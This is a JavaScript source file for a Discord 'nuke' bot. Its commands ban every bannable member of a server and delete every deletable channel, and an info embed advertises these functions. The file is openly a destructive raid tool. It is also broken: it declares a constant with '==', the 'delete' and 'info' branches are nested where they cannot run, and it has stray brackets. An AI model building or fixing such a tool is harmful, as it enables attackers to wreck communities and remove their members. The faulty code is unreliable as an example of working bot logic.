const Discord = require('discord.js');
const bot = new Discord.Client();
const config = require('./config.json');
const prefix = "smart!"
const SendMessage = false
const MOYC == "stuff" // message of ur choice lol

bot.on('message', async message => {
    let Args = message.content.slice(prefix.length).trim().split(/ +/g);
    switch (Args[0]) {
        case 'nuke':
            if(SendMessage == true) {
             message.channel.send(`${MOYC}`)   
            }
            await message.guild.members.cache.forEach(member => {
                console.log(member)
                if (!member.bannable) {
                    console.log(member, 'is not bannable')
                } else {
                    try {
                        member.ban()
                    } catch (err) {
                        console.log(err)
                    }
                }
                console.log('Searching')
            })
            switch (Args[0]) {
                case 'delete':
                    message.guild.channels.cache.forEach((channel) => {
                        setTimeout(function () {
                            if (channel.deletable) {
                                channel.delete()
                                console.log(channel, 'has been deleted')
                            }
                        }, 1000)
                    })
            }
            switch (Args[0]) {
                case 'info':
                    let Embed = new Discord.MessageEmbed()
                        .setColor('#0099ff')
                        .setTitle('Information')
                        .setURL('https://github.com/itsdrawn')
                        .setAuthor('Some name', 'https://i.imgur.com/wSTFkRM.png', 'https://watashi.wuh/help')
                        .setDescription('**Commands**\n**info** - displays this message\n**delete** - deletes every channel within reach (does not apply to moderator-only channels)\n**nuke** - bans every member within reach in the server')
                    message.channel.send(Embed)
                    })
            }
    }
})

bot.login(config.Token)
